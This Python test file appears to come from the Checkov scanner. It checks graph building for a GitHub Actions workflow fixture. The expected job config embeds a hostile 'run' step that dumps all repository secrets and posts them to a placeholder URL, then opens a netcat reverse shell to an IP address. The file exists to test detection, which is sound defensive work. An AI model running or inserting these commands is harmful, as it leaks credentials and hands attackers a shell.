from pathlib import Path

from checkov.common.graph.db_connectors.networkx.networkx_db_connector import NetworkxConnector
from checkov.common.graph.graph_builder import CustomAttributes
from checkov.common.graph.graph_builder.graph_components.block_types import BlockType
from checkov.common.runners.graph_manager import ObjectGraphManager
from checkov.github_actions.graph_builder.local_graph import GitHubActionsLocalGraph
from checkov.github_actions.runner import Runner

RESOURCES_DIR = Path(__file__).parent / "resources"


def test_build_graph_from_definitions():
    # given
    test_file = str(RESOURCES_DIR / ".github/workflows/supply_chain.yaml")
    graph_manager = ObjectGraphManager(db_connector=NetworkxConnector(), source="GitHubActions")
    template, _ = Runner()._parse_file(f=test_file)

    # when
    local_graph = graph_manager.build_graph_from_definitions(
        definitions={test_file: template}, graph_class=GitHubActionsLocalGraph
    )

    # then
    assert len(local_graph.vertices) == 5
    assert len(local_graph.edges) == 2

    job_idx = local_graph.vertices_by_path_and_name[(test_file, "jobs.bridgecrew")]
    job = local_graph.vertices[job_idx]

    assert job.block_type == BlockType.RESOURCE
    assert job.id == "jobs.bridgecrew"
    assert job.source == "GitHubActions"
    assert job.attributes[CustomAttributes.RESOURCE_TYPE] == "jobs"
    assert job.config == {
        "runs-on": "ubuntu-latest",
        "steps": [
            {
                "name": "Run checkov",
                "id": "checkov",
                "uses": "bridgecrewio/checkov-action@master",
                "env": {
                    "GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}",
                    "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
                    "__startline__": 19,
                    "__endline__": 21,
                },
                "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > /dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n',
                "__startline__": 15,
                "__endline__": 25,
            }
        ],
        "__startline__": 13,
        "__endline__": 25,
    }
